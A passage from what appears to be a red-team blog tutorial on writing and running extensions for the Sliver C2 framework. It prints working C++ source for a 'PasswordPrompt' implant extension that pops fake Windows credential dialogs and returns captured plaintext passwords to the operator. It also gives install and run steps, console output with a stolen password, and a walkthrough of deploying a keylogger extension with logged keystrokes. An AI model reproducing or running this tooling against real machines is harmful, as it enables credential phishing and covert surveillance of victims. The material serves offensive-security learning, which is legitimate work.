+	<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> data;
+	<span style="color:#66d9ef">int</span> len;
+	goCallback callback;
+};
+
+Output<span style="color:#f92672">*</span> <span style="color:#a6e22e">NewOutput</span>(<span style="color:#66d9ef">int</span> bufferSize, goCallback callback);
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">append</span>(Output<span style="color:#f92672">*</span> output, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> format, ...);
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">failure</span>(Output<span style="color:#f92672">*</span> output);
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">success</span>(Output<span style="color:#f92672">*</span> output);
+</code></pre></div><p>Apart from the callback itself, I define a struct <code>Output</code>
+which keeps all output-related information together.
+We need a buffer <code>data</code> containing the output,
+an integer <code>len</code> to keep track of buffer size
+and of course the callback itself.</p>
+<p>A function <code>NewOutput</code> allows to create a new <code>Output</code>
+with an initial buffer size and a reference to a callback.
+It is meant to be called once when the extension starts.
+You can then use the function <code>append</code> throughout the code to append more data to the output.
+The signature of this function is designed as a drop-in replacement of <code>printf</code>.
+We will have to take care to dynamically grow the output buffer size if needed.</p>
+<p>When your extension is done you want to call the <code>callback</code> exactly once.
+Not twice, not three times, also not zero times. Exactly once.
+It is easy to fuck this up.
+Therefore there are two functions <code>failure</code> and <code>success</code> which you should use in all places your extension returns.
+These functions use the <code>callback</code> on all the output accumulated so far,
+free the memory and return 1 or 0 respectively.</p>
+<p>Below is my implementation of all this, which I&rsquo;ve put into a file &ldquo;output.cpp&rdquo;:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;pch.h&#34;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;cstdint&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;output.h&#34;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+Output<span style="color:#f92672">*</span> <span style="color:#a6e22e">NewOutput</span>(<span style="color:#66d9ef">int</span> bufferSize, goCallback callback)
+{
+	<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Output</span> output;
+
+	output.len <span style="color:#f92672">=</span> bufferSize;
+
+	output.data <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)malloc(bufferSize);
+	memset(output.data, <span style="color:#ae81ff">0</span>, output.len);
+
+	output.callback <span style="color:#f92672">=</span> callback;
+
+	<span style="color:#66d9ef">return</span> <span style="color:#f92672">&amp;</span>output;
+}
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">append</span>(Output<span style="color:#f92672">*</span> output, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> format, ...)
+{
+	<span style="color:#75715e">// current output length
+</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">int</span> n <span style="color:#f92672">=</span> strlen((<span style="color:#f92672">*</span>output).data);
+
+	<span style="color:#75715e">// length of what we append
+</span><span style="color:#75715e"></span>	va_list args;
+	va_start(args, format);
+	<span style="color:#66d9ef">int</span> l <span style="color:#f92672">=</span> vsnprintf(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, format, args);
+	va_end(args);
+
+	<span style="color:#75715e">// grow buffer if needed
+</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">while</span> ((n <span style="color:#f92672">+</span> l) <span style="color:#f92672">&gt;</span> (<span style="color:#f92672">*</span>output).len) {
+		(<span style="color:#f92672">*</span>output).len <span style="color:#f92672">=</span> (<span style="color:#f92672">*</span>output).len <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>;
+		(<span style="color:#f92672">*</span>output).data <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)realloc((<span style="color:#f92672">*</span>output).data, (<span style="color:#f92672">*</span>output).len);
+	}
+
+	<span style="color:#75715e">// append to output
+</span><span style="color:#75715e"></span>	va_start(args, format);
+	vsnprintf((<span style="color:#f92672">*</span>output).data <span style="color:#f92672">+</span> strlen((<span style="color:#f92672">*</span>output).data), l <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>, format, args);
+	va_end(args);
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">success</span>(Output<span style="color:#f92672">*</span> output)
+{
+	(<span style="color:#f92672">*</span>output).callback((<span style="color:#f92672">*</span>output).data, strlen((<span style="color:#f92672">*</span>output).data));
+	free((<span style="color:#f92672">*</span>output).data);
+	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">failure</span>(Output<span style="color:#f92672">*</span> output)
+{
+	(<span style="color:#f92672">*</span>output).callback((<span style="color:#f92672">*</span>output).data, strlen((<span style="color:#f92672">*</span>output).data));
+	free((<span style="color:#f92672">*</span>output).data);
+	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+}
+</code></pre></div><p>Time to move on to the second function, the entrypoint.
+I called it <code>Execute</code> and you can see it in the code snippet below.
+What it does is roughly the following:</p>
+<ul>
+<li>use <code>NewOutput</code> to create a new <code>Output</code> struct and store it into a global variable so that it is available everywhere</li>
+<li>validate and parse the argument string, which is expected to be the number of times we want to ask for credentials</li>
+<li>run <code>askForCreds</code> and then return the result</li>
+</ul>
+<p>Note that I&rsquo;ve also added a global variable <code>counter</code>, which is supposed to count
+the total number of times we have shown the password prompt dialog box
+(further below we will modify <code>askForCreds</code> to track this).
+In the end we append this as output.
+This is pretty useless but stay tuned. It will illustrate something you should know.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;pch.h&#34;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;wincred.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;cstdint&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;output.h&#34;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#pragma comment(lib, &#34;Credui.lib&#34;)
+</span><span style="color:#75715e"></span>
+
+BOOL APIENTRY <span style="color:#a6e22e">DllMain</span>(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
+{
+	...
+}
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">askForCreds</span>(DWORD maxTries);
+<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> <span style="color:#a6e22e">w2a</span>(WCHAR<span style="color:#f92672">*</span> orig);
+
+<span style="color:#66d9ef">int</span> counter <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+Output<span style="color:#f92672">*</span> output;
+
+<span style="color:#66d9ef">extern</span> <span style="color:#e6db74">&#34;C&#34;</span> {
+	<span style="color:#66d9ef">__declspec</span>(dllexport) <span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> Execute(<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> argsBuffer, <span style="color:#66d9ef">uint32_t</span> bufferSize, goCallback callback);
+}
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">Execute</span>(<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> argsBuffer, <span style="color:#66d9ef">uint32_t</span> bufferSize, goCallback callback)
+{
+	output <span style="color:#f92672">=</span> NewOutput(<span style="color:#ae81ff">128</span>, callback);
+
+	<span style="color:#66d9ef">if</span> (bufferSize <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1</span>) {
+		append(output, <span style="color:#e6db74">&#34;You must provide an argument</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+		<span style="color:#66d9ef">return</span> failure(output);
+	}
+
+	errno <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+	DWORD maxTries <span style="color:#f92672">=</span> strtol(argsBuffer, NULL, <span style="color:#ae81ff">10</span>);
+	<span style="color:#66d9ef">if</span> (errno <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> maxTries <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+        append(output, <span style="color:#e6db74">&#34;You must provide a positive integer as argument</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+        <span style="color:#66d9ef">return</span> failure(output);
+	}
+
+    append(output, <span style="color:#e6db74">&#34;Asking for credentials at most %d times</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, maxTries);
+	askForCreds(maxTries);
+	append(output, <span style="color:#e6db74">&#34;Done, total password prompt counter: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, counter);
+
+	<span style="color:#66d9ef">return</span> success(output);
+}
+
+...
+</code></pre></div><p>As written before, some adjustments to the actual DLL code are needed.
+The code snippet below shows what changes I made to the original code from
+<a href="../../post/learning_sliver_c2_10_sideload/#basic-usage-demonstration">post 10</a>.
+We have to use <code>append</code> to print the output and
+we must maintain the new <code>counter</code> variable:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">...
+
+<span style="color:#66d9ef">void</span> askForCreds(DWORD maxTries)
+{
+	...
+	<span style="color:#66d9ef">while</span> ((loginStatus <span style="color:#f92672">==</span> FALSE) <span style="color:#f92672">&amp;&amp;</span> (numTries <span style="color:#f92672">&lt;</span> maxTries)) {
+		...
+		<span style="color:#66d9ef">if</span> (dwAuthError <span style="color:#f92672">==</span> ERROR_SUCCESS) {
+			...
+			counter <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>;
+			<span style="color:#66d9ef">if</span> (loginStatus <span style="color:#f92672">==</span> TRUE) {
+				CloseHandle(handle);
+				append(output, <span style="color:#e6db74">&#34;Correct credentials: %s:%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, w2a(pszUserName), w2a(pszPassword));
+				<span style="color:#66d9ef">break</span>;
+			}
+			<span style="color:#66d9ef">else</span> {
+				append(output, <span style="color:#e6db74">&#34;Wrong credentials: %s:%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, w2a(pszUserName), w2a(pszPassword));
+			}
+		}
+	}
+}
+
+<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> <span style="color:#a6e22e">w2a</span>(WCHAR<span style="color:#f92672">*</span> wstr)
+{
+	<span style="color:#66d9ef">const</span> size_t n <span style="color:#f92672">=</span> (wcslen(wstr) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>;
+	<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> astr <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">char</span>[n];
+
+	size_t dummy <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+	wcstombs_s(<span style="color:#f92672">&amp;</span>dummy, astr, n, wstr, _TRUNCATE);
+
+	<span style="color:#66d9ef">return</span> astr;
+}
+</code></pre></div><p>You may wonder what the function <code>w2a(WCHAR* orig)</code> is good for.
+This is a manifestation of the madness of programming in C/C++ with Windows strings.
+There are <a href="https://learn.microsoft.com/en-us/windows/win32/learnwin32/working-with-strings">Unicode and ANSI strings</a>
+and these are incompatible.
+Sliver&rsquo;s callback likes its output in ANSI but my DLL creates its output in Unicode.
+You may expect that Stackoverflow is full of answers for this and so did I.
+But holy shit did it take time to find a solution that converts the strings, does not have an unreasonable number of lines and does not throw errors.
+<a href="https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/wcstombs-s-wcstombs-s-l">wcstombs_s</a> came to the rescue.</p>
+<p>This should be all the code we need.
+Try to build your result both as an x64 and x86 DLL.
+If it does not work and you can&rsquo;t figure out why then get the
+<a href="https://github.com/DominicBreuker/SliverSamples/tree/main/PasswordPromptExtension">full Visual Studio solution</a>
+from GitHub. Might be easier than to track down your mistake.</p>
+<p>Time to bundle your result as a Sliver extension.
+Besides compiled DLLs for all supported systems and architectures you need a file &ldquo;extension.json&rdquo;,
+also called the extension manifest.
+The purpose of the manifest is to:</p>
+<ul>
+<li>tell Sliver how to run your extension: which file should be used for a given system and architecture and what is the entrypoint</li>
+<li>customize the operator UX for the extension command: define a name for the command as well as
+author, version, help text, &hellip; which will all later be displayed in the Sliver console</li>
+</ul>
+<p>All possible options are explained <a href="https://github.com/BishopFox/sliver/tree/master/client/command/extensions">here in the Sliver repository</a>.
+In my case I wrote the following manifest:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
+    <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;PasswordPrompt&#34;</span>,
+    <span style="color:#f92672">&#34;command_name&#34;</span>: <span style="color:#e6db74">&#34;PasswordPrompt&#34;</span>,
+    <span style="color:#f92672">&#34;version&#34;</span>: <span style="color:#e6db74">&#34;0.0.1&#34;</span>,
+    <span style="color:#f92672">&#34;extension_author&#34;</span>: <span style="color:#e6db74">&#34;dominicbreuker&#34;</span>,
+    <span style="color:#f92672">&#34;original_author&#34;</span>: <span style="color:#e6db74">&#34;dominicbreuker&#34;</span>,
+    <span style="color:#f92672">&#34;repo_url&#34;</span>: <span style="color:#e6db74">&#34;https://github.com/dominicbreuker/SliverSamples/PasswordPromptExtension&#34;</span>,
+    <span style="color:#f92672">&#34;help&#34;</span>: <span style="color:#e6db74">&#34;Shows a dialog box asking the user for credentials. Repeats until the correct password is entered. Pass as argument the max. number of times to ask.&#34;</span>,
+    <span style="color:#f92672">&#34;entrypoint&#34;</span>: <span style="color:#e6db74">&#34;Execute&#34;</span>,
+    <span style="color:#f92672">&#34;files&#34;</span>: [
+        {
+            <span style="color:#f92672">&#34;os&#34;</span>: <span style="color:#e6db74">&#34;windows&#34;</span>,
+            <span style="color:#f92672">&#34;arch&#34;</span>: <span style="color:#e6db74">&#34;386&#34;</span>,
+            <span style="color:#f92672">&#34;path&#34;</span>: <span style="color:#e6db74">&#34;PasswordPromptExtension.x86.dll&#34;</span>
+        },
+        {
+            <span style="color:#f92672">&#34;os&#34;</span>: <span style="color:#e6db74">&#34;windows&#34;</span>,
+            <span style="color:#f92672">&#34;arch&#34;</span>: <span style="color:#e6db74">&#34;amd64&#34;</span>,
+            <span style="color:#f92672">&#34;path&#34;</span>: <span style="color:#e6db74">&#34;PasswordPromptExtension.x64.dll&#34;</span>
+        }
+    ]
+}
+</code></pre></div><p>Put all the files, i.e., the JSON file and your DLLs, inside a single folder or create a <code>.tar.gz</code> archive.
+This is now a complete extension.</p>
+<h3 id="install-and-run">Install and run</h3>
+<p>The extension is ready but we are not ready to run it yet.
+Extensions must be installed before they can be run.
+Lets do that.</p>
+<p>Get the folder or <code>.tar.gz</code> archive over to the machine you run the Sliver console on.
+In my case this is the C2 server.
+You can put them anywhere you like.
+For example::</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/PasswordPrompt]
+└─$ ll
+total 32
+-rw-r--r-- 1 kali kali   769 Mar 14 22:28 extension.json
+-rw-r--r-- 1 kali kali 15360 Mar 19 19:43 PasswordPromptExtension.x64.dll
+-rw-r--r-- 1 kali kali 12288 Mar 19 19:43 PasswordPromptExtension.x86.dll
+</code></pre><p>Now open the Sliver console and use the <code>extensions install</code> command.
+Provide the path to the directory containing all your files as an argument:
+(or alternatively the path to the <code>.tar.gz</code> archive):</p>
+<pre tabindex="0"><code>sliver &gt; extensions install /home/kali/PasswordPrompt
+
+[*] Installing extension 'PasswordPrompt' (0.0.1) ...
+sliver &gt; extensions load PasswordPrompt
+
+[*] Added PasswordPrompt command: Ask for credentials
+</code></pre><p>Now you should have a new subfolder in your <code>~/.sliver-client</code> directory.
+All files were copied to it.
+You could probably just put them there yourself instead of doing the install,
+e.g., if you want to automate your machine setup:</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/.sliver-client/extensions/PasswordPrompt]
+└─$ ll                                           
+total 32
+-rw------- 1 kali kali   769 Mar 19 19:56 extension.json
+-rw-r--r-- 1 kali kali 15360 Mar 19 19:56 PasswordPromptExtension.x64.dll
+-rw-r--r-- 1 kali kali 12288 Mar 19 19:56 PasswordPromptExtension.x86.dll
+</code></pre><p>Just for completeness: you could also use <code>extensions rm PasswordPrompt</code> to get rid of the extension
+or delete <code>~/.sliver-client/extensions/PasswordPrompt</code> manually.</p>
+<p>Note that this is a directory that belongs to the Sliver client, not to the server.
+In my case they just happen to be on the same VM.
+An extension is not installed to the server.
+It is installed just for you and other operators have to do the same if they want to use it.</p>
+<p>The impatient reader is probably trying to run the brand-new <code>PasswordPrompt</code> command right now.
+Frustration alert: it is not available and this is not a bug.
+You have to run <code>extensions load /home/kali/PasswordPrompt</code> or restart the Sliver client.
+This makes the new command called <code>PasswordPrompt</code> available.
+By the way, this is the name we gave it in the &ldquo;extension.json&rdquo; (with <code>name</code>).</p>
+<p>Now we are done. Use a beacon and give it a go:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/38_sliver_c2_extensions/password_prompt_works.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>The extension executes on the 2nd run</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>Great! It shows the dialog box as expected.
+Enter the wrong password and it should ask again.
+Now enter the correct password and verify that you receive output in the Sliver console:</p>
+<pre tabindex="0"><code>sliver (TYPICAL_TOOTHPICK) &gt; PasswordPrompt 3
+
+[*] Tasked beacon TYPICAL_TOOTHPICK (47e3ef4f)
+
+[+] TYPICAL_TOOTHPICK completed task 47e3ef4f
+
+[*] Successfully executed PasswordPrompt
+[*] Got output:
+Asking for credentials at most 3 times
+Wrong credentials: DESKTOP-QPADJJ1\tester:WRONG
+Correct credentials: DESKTOP-QPADJJ1\tester:youc4nn0tguessthisone
+Done, total password prompt counter: 2
+</code></pre><p>Nice! It all worked.
+We got the password.
+A great success.</p>
+<p>Now lets see what happens when we repeat this process.
+I ran the extension again and also performed the same actions on the target Windows machine.
+First I entered the wrong password, then the correct one.
+What would you think was the output of that?</p>
+<p>Of course it should be almost the same, but you may expect the last line
+to be <code>Done, total password prompt counter: 4</code>,
+since now we have shown the password prompt dialog 4 times in total.
+However, it displays the same result as before and claims showed it just 2 times.</p>
+<p>This is because we use a beacon implant, which loads a fresh copy of the extension each time you run it.
+Whatever you stored in a global variable during one run of the extension is unreachable in the next.
+Sliver does that because it does not know if you loaded the extension onto this implant already.
+To be on the safe side it loads it every time.</p>
+<p>This behavior is different if you use a session implant.
+A session can ask the implant if it has loaded a specific extension and load it only of not.
+Otherwise it will just run the extension that is already there.
+The effect of that is that global variables maintain state that is available to future runs of the extension.</p>
+<p>Kill your current beacon and get a fresh one to see this in action.
+Get a session from the new beacon with <code>interactive</code>. Got one? Great!
+Now do the same thing again run the extension 2x.
+For example, your output could look like this:</p>
+<pre tabindex="0"><code>sliver (TYPICAL_TOOTHPICK) &gt; PasswordPrompt 3
+
+[*] Successfully executed PasswordPrompt
+[*] Got output:
+Asking for credentials at most 3 times
+Wrong credentials: DESKTOP-QPADJJ1\tester:abc123
+Correct credentials: DESKTOP-QPADJJ1\tester:youc4nn0tguessthisone
+Done, total password prompt counter: 2
+
+
+sliver (TYPICAL_TOOTHPICK) &gt; PasswordPrompt 3
+
+[*] Successfully executed PasswordPrompt
+[*] Got output:
+Asking for credentials at most 3 times
+Wrong credentials: DESKTOP-QPADJJ1\tester:gehweg
+Wrong credentials: DESKTOP-QPADJJ1\tester:diesmalnichtfreundchen
+Wrong credentials: DESKTOP-QPADJJ1\tester:daskannstemitdeineromamachen
+Done, total password prompt counter: 5
+</code></pre><p>Now we can see that the counter was 2 after the first run and 2 + 3 = 5 in the end.
+The value of the global variable survived since we just called the entrypoint in the same block of memory twice.</p>
+<h2 id="sliverkeylogger-extension">SliverKeylogger extension</h2>
+<p>Let&rsquo;s now have a look at the <a href="https://github.com/trustedsec/SliverKeylogger">SliverKeylogger</a>,
+an extension available on GitHub.
+It nicely illustrates how you can use global state to manage a long-running background process
+you can interact with.</p>
+<p>If you did not read the previous section: use this extension only from a session implant, not from a beacon.
+Else you will experience incomprehensible bugs that drive you mad.
+If you read the previous section you know you why beacon keylogging does not work.</p>
+<p>Check out the <a href="https://github.com/trustedsec/SliverKeylogger">SliverKeylogger repository</a> and build the binaries,
+which will appear in the &ldquo;./bin&rdquo; subfolder along with the &ldquo;extension.json&rdquo;.
+You can install this in the same way we saw before.
+Alternatively you could probably use the <code>.tar.gz</code> archive they released on GitHub (at your own risk).
+However, you will not get exactly the output you can see here in this post.
+This is because I took the liberty to make one small modification to the code before I built it.
+My <a href="https://github.com/trustedsec/SliverKeylogger/blob/master/SliverKeylogger/keylogger.cpp#L77">keylogger.cpp</a>
+got two additional lines in between 77 and 78 to make sure the keylogger confirms that it started:</p>
+<pre tabindex="0"><code>/*  36 */ int entrypoint(char* argsBuffer, uint32_t bufferSize, goCallback callback)
+/*  37 */ {
+              ...
+/*  48 */     switch (cmd)
+/*  49 */     {
+/*  50 */     case 0: //stop
+                  ...
+/*  67 */     case 1: // start
+/*  68 */         if (keypumpRunning)
+/*  69 */         {
+                      ...
+/*  72 */         }
+/*  73 */         else
+/*  74 */         {
+/*  75 */             _queue = std::make_shared&lt;SharedQueue&gt;();
+/*  76 */             messagePump = std::make_unique&lt;std::thread&gt;(&amp;startKeylogger);
+/*  77 */             
+/* --&gt; */             std::string msg{ &quot;Keylogger started&quot; };
+/* --&gt; */             callback(msg.c_str(), msg.length());
+/*  78 */         }
+/*  79 */         break;
+/*  80 */     case 2: // get logs
+                  ...
+/* 102 */     default:
+/* 103 */     {
+                 ...
+/* 106 */     }
+/* 107 */     }
+/* 108 */ 
+/* 109 */     return 0;
+/* 110 */ }
+</code></pre><p>You should now have a command <code>raw_keylogger</code>.
+Use <code>raw_keylogger --help</code> to learn how to use the command, or read the &ldquo;extension.json&rdquo; where the help text comes from.
+You learn the keylogger is started with argument <code>1</code>, then you read output with <code>2</code> later on.
+Argument <code>0</code> terminates the keylogger.</p>
+<p>While using your session implant, you can now start keylogging.
+The extension confirms that it started and you could move on to other shenanigans.
+If you forget my modification above then Sliver gives you an error saying &ldquo;The specified module could not be found.&rdquo; but it works nevertheless.
+The keylogger runs in the background:</p>
+<pre tabindex="0"><code>sliver (TYPICAL_TOOTHPICK) &gt; raw_keylogger 1
+
+[*] Successfully executed raw_keylogger
+[*] Got output:
+Keylogger started
+</code></pre><p>Now use the Windows target and write some text so that we can see if the keylogger works.
+For example, I searched for notepad, opened it, wrote some text and removed parts of it with backspace.
+Then I saved the file and gave it a custom name.
+Here is a screenshot from the middle of the process, just to illustrate:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/38_sliver_c2_extensions/using_notepad.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Using the notepad editor while the keylogger runs</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>Back in the Sliver console, use argument 2 to fetch output from the keylogger.
+This is what it looked like for me:</p>
+<pre tabindex="0"><code>sliver (TYPICAL_TOOTHPICK) &gt; raw_keylogger 2
+
+[*] Successfully executed raw_keylogger
+[*] Got output:
+
+2023-3-19 20:49 [ Search ]
+notepad[enter]
+
+2023-3-19 20:50 [ Untitled - Notepad ]
+this is some text written into notepad.[enter]
+some more text.[bs][bs][bs][bs][bs][bs][bs][bs][bs][bs][bs][bs][bs][bs][bs]never mind.
+2023-3-19 20:50 [ Save As ]
+[←][←][←][→]sometext[enter]
+</code></pre><p>You can not only see the keys I&rsquo;ve pressed but also the titles of the Windows I focused
+along with corresponding timestamps.
+Special characters have their own representation which is mostly self-explanatory.
+You could also look them up
+<a href="https://github.com/trustedsec/SliverKeylogger/blob/ac7adaca3ef02315bef2deba8200e98865f21118/SliverKeylogger/WinMsgHandler.cpp#L200">here</a>.</p>
+<p>Pretty evil and impressive.
+So evil that we have to stop this.
+Since Defender did not do anything we have to put an end to it ourselves.
+Use argument 0:</p>
+<pre tabindex="0"><code>sliver (TYPICAL_TOOTHPICK) &gt; raw_keylogger 0
+
+[*] Successfully executed raw_keylogger
+[*] Got output:
+Keylogger stopped
+</code></pre><h2 id="implementation-details-and-source-code">Implementation details and source code</h2>
+<p>In this section, I will provide a brief overview of Sliver&rsquo;s internal workings pertaining to extensions.
+It&rsquo;s worth noting that this is a complex feature, and as a result, my discussion will only scratch the surface.
+Nevertheless, this tour through the code should provide sufficient insight for those interested in modifying it or troubleshooting bugs.</p>
+<p>Also note that Sliver supports the execution of Beacon Object Files (BOFs) through extensions.
+There is dedicated extension code that specifically facilitates BOF execution.
+However, for the sake of simplicity, I will not delve into this feature in this post but may cover it in a subsequent one.</p>
+<p>All source code files mentioned below will be relative to the root of the
+<a href="https://github.com/BishopFox/sliver/tree/https://github.com/BishopFox/sliver/tree/749f71d226e5bd239d6513feeb99faf6804a8d28">Sliver GitHub repo</a>,
+commit 749f71d226, which is version v1.5.35 with a few commits on top.</p>
+<h3 id="sliver-client">Sliver Client</h3>
+<p>Let&rsquo;s start with the simple commands.
+The <code>extensions install</code> command is located in <code>client/command/extensions/install.go</code>.
+You see how the <a href="https://github.com/BishopFox/sliver/blob/749f71d226e5bd239d6513feeb99faf6804a8d28/client/command/extensions/install.go#L35">ExtensionsInstallCmd</a>
+mainly parses the &ldquo;extension.json&rdquo; manifest and copies files into the right place.
+It can handle either <code>.tar.gz</code> archives or read files from a directory.</p>
+<p>Source code for the <a href="https://github.com/BishopFox/sliver/blob/749f71d226e5bd239d6513feeb99faf6804a8d28/client/command/extensions/load.go#L105">ExtensionLoadCmd</a>
+is in <code>client/command/extensions/load.go</code> and also straightforward. It parses a manifest and registers the command in your Sliver client.
+Commands for all installed extensions will also be registered automatically when you launch the client
+(it seems to happen <a href="https://github.com/BishopFox/sliver/blob/749f71d226e5bd239d6513feeb99faf6804a8d28/client/command/commands.go#L123">here</a>).</p>
+<p>The interesting part starts when you actually run an extension,
+which happens in the <a href="https://github.com/BishopFox/sliver/blob/749f71d226e5bd239d6513feeb99faf6804a8d28/client/command/extensions/load.go#L307">runExtensionCmd</a>
+in the command previously registered (<a href="https://github.com/BishopFox/sliver/blob/749f71d226e5bd239d6513feeb99faf6804a8d28/client/command/extensions/load.go#L181">here</a>)
+This function finally interacts with the implant.</p>
+<p>The first step is to call the
+<a href="https://github.com/BishopFox/sliver/blob/749f71d226e5bd239d6513feeb99faf6804a8d28/client/command/extensions/load.go#L223">loadExtension</a>
+function <a href="https://github.com/BishopFox/sliver/blob/749f71d226e5bd239d6513feeb99faf6804a8d28/client/command/extensions/load.go#L335">in line 335</a>
+with an argument <code>checkCache</code> that will be true for session implants and false for beacons.
+The function&rsquo;s responsibility is to get the extension binary over to the implant using a <code>RegisterExtension</code> RPC call,
+which is wrapped into the <a href="https://github.com/BishopFox/sliver/blob/749f71d226e5bd239d6513feeb99faf6804a8d28/client/command/extensions/load.go#L274">registerExtension</a> function.
+For session implants a <code>ListExtensions</code> RPC call is dispatched first to get all loaded extensions
+and <code>RegisterExtension</code> is sent only if the current extension is not in the list.
+A beacon does not check the cache.
+Accordingly, it always registers it again.
+There is also special BOF code which I ignore here
+(<a href="https://github.com/BishopFox/sliver/blob/749f71d226e5bd239d6513feeb99faf6804a8d28/client/command/extensions/load.go#L254">line 254 and below</a>).</p>
+<p>Back in the
+<a href="https://github.com/BishopFox/sliver/blob/749f71d226e5bd239d6513feeb99faf6804a8d28/client/command/extensions/load.go#L223">loadExtension</a>
+function, the second step is to send a <code>CallExtension</code> RPC call in
+<a href="https://github.com/BishopFox/sliver/blob/749f71d226e5bd239d6513feeb99faf6804a8d28/client/command/extensions/load.go#L373">line 373</a>.
+The argument string is prepared above.
+Again there is some code related to BOFs that we ignore for now.
+Code below line 373 is responsible for response processing and display.</p>
+<h3 id="sliver-server">Sliver server</h3>
+<p>Overall we saw three different RPC calls in the code.
